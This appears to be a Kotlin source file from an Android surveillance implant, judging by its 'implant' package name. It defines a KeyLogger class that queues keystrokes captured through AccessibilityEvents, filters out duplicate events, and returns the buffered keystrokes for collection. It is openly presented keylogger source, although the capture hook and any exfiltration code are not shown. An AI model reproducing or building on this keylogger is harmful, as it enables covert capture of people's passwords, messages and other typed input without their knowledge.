/*
* Records keystrokes sent from the Keyboard and adds them to a queue.
* Since Android sometimes sends duplicate AccessibilityEvents, we store the timestamp of the last
* keystroke and ensure that the key events are far apart enough to be typed by a human before
* adding them to the queue.
* Spaces, backspace and enter keys are currently unsupported as no AccessibilityEvent seems to be
* fired for them.
* */

package com.cooperthecoder.implant

import java.util.*
import java.util.concurrent.atomic.AtomicLong

class KeyLogger {

    val keystrokeQueue: Queue<String> = LinkedList<String>()
    val lastEvent = AtomicLong(0)

    fun recordKeystroke(keystroke: String, time: Long) {
        // Avoid duplicate events from Android
        val elapsed = time - lastEvent.get()
        if (elapsed < Config.KEY_PRESS_TIMEOUT) {
            return
        }

        lastEvent.set(time)
        keystrokeQueue.add(keystroke)
    }

    fun emptyKeyQueue(): String {
        val keystrokes = keystrokeQueue.joinToString("-")
        keystrokeQueue.clear()
        return keystrokes
    }
}